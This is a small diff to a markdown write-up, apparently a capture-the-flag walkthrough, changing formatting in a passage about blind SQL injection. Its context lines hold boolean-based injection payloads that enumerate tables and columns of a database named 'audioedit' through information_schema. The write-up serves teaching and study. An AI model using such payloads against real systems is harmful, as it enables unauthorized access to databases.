@@ -120,7 +120,7 @@ Unfortunately, it's hard to include this upper payload in SQLi, and that's why I
 
 `' and 2=2 or (SELECT substr(table_name,1,1) FROM information_schema.tables where table_schema = 'audioedit' limit 1)='h' or '`   
  
-I also modified the `setcmd()` function slightly and exploiting gives me `audioedit` which is the same as the database name. Ah, I was tired and irritated. Took some caffeine again and got started. For numbers of columns in that table, querying information schema I used this:   
+I also modified the `setcmd()` function slightly and exploiting gives me audioedit which is the same as the database name. Ah, I was tired and irritated. Took some caffeine again and got started. For numbers of columns in that table, querying information schema I used this:   
 
 `' and 2=2 or (SELECT substr(count(*),1,1) FROM information_schema.columns WHERE table_name = 'audioedit')=1 or '`  
 <br>
